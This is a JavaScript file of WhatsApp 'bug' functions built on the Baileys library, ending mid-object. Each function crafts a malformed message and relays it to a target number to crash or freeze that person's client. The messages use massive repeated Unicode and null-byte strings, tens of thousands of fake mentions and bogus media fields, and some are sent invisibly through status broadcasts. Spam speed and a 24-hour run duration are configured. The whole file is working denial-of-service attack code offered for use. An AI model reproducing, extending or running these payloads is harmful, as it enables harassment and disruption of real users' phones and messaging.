import { generateWAMessageFromContent, proto } from "baileys";
import crypto from "crypto";

// ===================== HELPERS =====================
export const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===================== BUG FUNCTIONS =====================
//=================================================//
function wait(ms) {
    return new Promise(res => setTimeout(res, ms));
}
//=================================================//
const CallQueue = [];
let wtfBro = false;
const memek_ibulu = 10;//ANGKA SPAM MAKIN GEDE MAKIN CEPET SPAM NYA
const delay_kont = 5;//DELAY SPAM MAKIN GEDE ANGKA NYA MAKIN LAMBAT DELAY NYA
let adaptiveKontl = delay_kont;
//=================================================//

// =======================
// HELPERS / RATE LIMIT / UTILS
const DEFAULT_RATE_LIMIT_MS = 800;
const lastSentAt = new Map();  
const RUN_DURATION = 24 * 60 * 60 * 1000; 
function enforceRateLimit(sockId, ms = DEFAULT_RATE_LIMIT_MS) {
  const now = Date.now();
  const last = lastSentAt.get(sockId) || 0;
  if (now - last < ms) return ms - (now - last);
  lastSentAt.set(sockId, now);
  return 0;
}

function toJid(number) {
  if (!number) throw new Error("Missing target number");
  const digits = String(number).replace(/[^0-9]/g, "");
  if (digits.length < 5) throw new Error("Number too short");
  return digits.endsWith("@s.whatsapp.net") ? digits : `${digits}@s.whatsapp.net`;
}

function clampText(s, max) {
  if (!s) return "";
  return s.length > max ? s.slice(0, max - 3) + "..." : s;
}

// BUG FUNCTION
async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `In Scorpio Locked You Device`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "ScorpioCrash" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    surz.relayMessage(target, messagePayload, {}, { messageId: null });
}
async function invico1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await surz.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function invisiblenew(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "𝐃𝐈𝐀𝐍𝐀𝐆𝐀𝐍𝐊-‣🚀 ",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "INVISIBLE -𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣𐎟𑆻",
                    footerText: "𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣ ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻𝐇𝐈𝐈 𝐈'𝐀𝐌 𝐃𝐈𝐀𝐍𝐀⍣ 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await surz.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await surz.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻𝐃𝐈𝐀𝐍𝐀 𝐇𝐀𝐃𝐈𝐑 𝐏𝐀𝐊⍣𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function protocol6(target, mention) {
  const quotedMessage = {
    extendedTextMessage: {
      text: "᭯".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0000".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "BoomXSuper",
          body: "\u0000".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
        },
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
      }
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "💥".repeat(1770),
      serviceType: 1
    }
  };

  const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".SurzHeree" + "ោ៝".repeat(1000),
    title: "MegumiAgency",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "109951162777600",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "ꦾ".repeat(1277),
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "☠️ - んジェラルド - ☠️",
        body: "\u0000".repeat(9117),
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://" + "ꦾ".repeat(100) + ".com/"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      quotedMessage,
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "ꦾ".repeat(100)
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await surz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await surz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}
async function NotifFreeze(target) {
      surz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "surz.com" + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Neobest.cloud.com" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
async function Surz7(target, Ptcp = true) {
    let virtex = "🐉생성됨 𝗗𝗜𝗔𝗡𝗔 𝗕𝗵𝗮𝗵𝗮𝗵𝗮𝗵𝘄𝘄𝗮𝗵𝗵 공식" + "ꦾ".repeat(49000);
    await surz.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function protocolbug4(target, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `>_<\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "TACHI" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await surz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function protocolbug5(target, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝗗𝗜𝗔𝗡𝗔 𝗜𝗦𝗛𝗲𝗿𝗲𝗲𝗲" + "ោ៝".repeat(10000),
        title: "Megumi",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌖𐌉𐌍𐌂𐍃 ✦ 𐌔𐌖𐍀𐌄𐍂𐌍𐌰𐌙𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳDiana Dekᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                              musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await surz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await surz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function Wraperos2(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Diana WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
